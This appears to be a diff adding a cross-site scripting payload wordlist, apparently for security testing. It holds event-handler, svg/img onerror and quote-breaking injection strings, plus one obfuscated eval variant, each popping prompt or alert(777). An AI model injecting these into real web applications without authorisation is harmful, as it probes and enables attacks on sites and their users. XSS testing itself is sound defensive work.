@@ -1,0 +1,38 @@
+"-prompt(777)-"
+'-prompt(777)-'
+";a=prompt,a(777)//
+';a=prompt,a(777)//
+'-eval("window['pro'%2B'mpt'](777)")-'
+"-eval("window['pro'%2B'mpt'](777)")-"
+"onclick=prompt(777)>"@x.y
+"onclick=prompt(777)><svg/onload=prompt(777)>"@x.y
+<image/src/onerror=prompt(777)>
+<img/src/onerror=prompt(777)>
+<image src/onerror=prompt(777)>
+<img src/onerror=prompt(777)>
+<image src =q onerror=prompt(777)>
+<img src =q onerror=prompt(777)>
+</scrip</script>t><img src =q onerror=prompt(777)>
+<svg onload=alert(777)>
+"><svg onload=alert(777)//
+"onmouseover=alert(777)//
+"autofocus/onfocus=alert(777)//
+'-alert(777)-'
+'-alert(777)//
+\'-alert(777)//
+</script><svg onload=alert(777)>
+<x contenteditable onblur=alert(777)>lose focus! 
+<x onclick=alert(777)>click this! 
+<x oncopy=alert(777)>copy this! 
+<x oncontextmenu=alert(777)>right click this! 
+<x oncut=alert(777)>copy this! 
+<x ondblclick=alert(777)>double click this! 
+<x ondrag=alert(777)>drag this! 
+<x contenteditable onfocus=alert(777)>focus this! 
+<x contenteditable oninput=alert(777)>input here! 
+<x contenteditable onkeydown=alert(777)>press any key! 
+<x contenteditable onkeypress=alert(777)>press any key! 
+<x contenteditable onkeyup=alert(777)>press any key! 
+<x onmousedown=alert(777)>click this! 
+<x onmousemove=alert(777)>hover this! 
+<x onmouseout=alert(777)>hover this! 
